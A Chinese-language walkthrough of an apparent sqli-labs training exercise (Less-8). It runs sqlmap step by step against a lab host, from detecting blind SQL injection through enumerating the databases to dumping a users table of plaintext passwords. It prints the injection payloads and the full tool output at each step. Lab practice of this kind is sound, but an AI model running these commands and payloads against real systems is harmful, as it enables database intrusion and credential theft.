### 1.测试有没有注入点

```shell
 python sqlmap.py -u http://10.16.2.3:8081/Less-8/?id=1 --batch
```

输出：

```
[10:14:30] [INFO] testing connection to the target URL
[10:14:30] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:14:30] [INFO] testing if the target URL content is stable
[10:14:30] [INFO] target URL content is stable
[10:14:30] [INFO] testing if GET parameter 'id' is dynamic
[10:14:30] [INFO] GET parameter 'id' appears to be dynamic
[10:14:30] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[10:14:30] [INFO] testing for SQL injection on GET parameter 'id'
[10:14:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:14:31] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="are")
[10:14:31] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
...
...

GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 255 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 7040=7040 AND 'MGwj'='MGwj

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 8026 FROM (SELECT(SLEEP(5)))mbnL) AND 'RSAa'='RSAa
---
[10:14:44] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.5.9, Apache 2.4.7
back-end DBMS: MySQL >= 5.0.12
[10:14:44] [INFO] fetched data logged to text files under 'C:\Users\wiles\AppData\Local\sqlmap\output\10.16.2.3'

[*] ending @ 10:14:44 /2024-12-16/

```



### 2. **获取数据库信息**

你使用了以下命令来列出数据库：

```
python sqlmap.py -u http://10.16.2.3:8081/Less-8/?id=1 --batch --dbs
```

得到的数据库如下：

```
available databases [5]:
[*] `security`
[*] challenges
[*] information_schema
[*] mysql
[*] performance_schema
```

### 3. **列出 `security` 数据库中的所有表**

你使用了以下命令：

```
python sqlmap.py -u http://10.16.2.3:8081/Less-8/?id=1 --batch -D security --tables
```

得到的表如下：

```
Database: security
[4 tables]
+----------+
| emails   |
| referers |
| uagents  |
| users    |
+----------+
```

### 4. **列出 `users` 表中的所有列**

你接着列出了 `users` 表中的所有列：

```
python sqlmap.py -u http://10.16.2.3:8081/Less-8/?id=1 --batch -D security -T users --columns
```

得到的列如下：

```
Database: security
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(3)      |
| password | varchar(20) |
| username | varchar(20) |
+----------+-------------+
```

### 5. **从 `users` 表中提取数据**

最后，你使用了以下命令从 `users` 表中提取所有数据：

```
python sqlmap.py -u http://10.16.2.3:8081/Less-8/?id=1 --batch -D security -T users --dump
```

得到的结果如下：

```
Database: security
Table: users
[13 entries]
+----+------------+----------+
| id | password   | username |
+----+------------+----------+
| 1  | Dumb       | Dumb     |
| 2  | I-kill-you | Angelina |
| 3  | p@ssword   | Dummy    |
| 4  | crappy     | secure   |
| 5  | stupidity  | stupid   |
| 6  | genious    | superman |
| 7  | mob!le     | batman   |
| 8  | admin      | admin    |
| 9  | admin1     | admin1   |
| 10 | admin2     | admin2   |
| 11 | admin3     | admin3   |
| 12 | dumbo      | dhakkan  |
| 14 | admin4     | admin4   |
+----+------------+----------+
```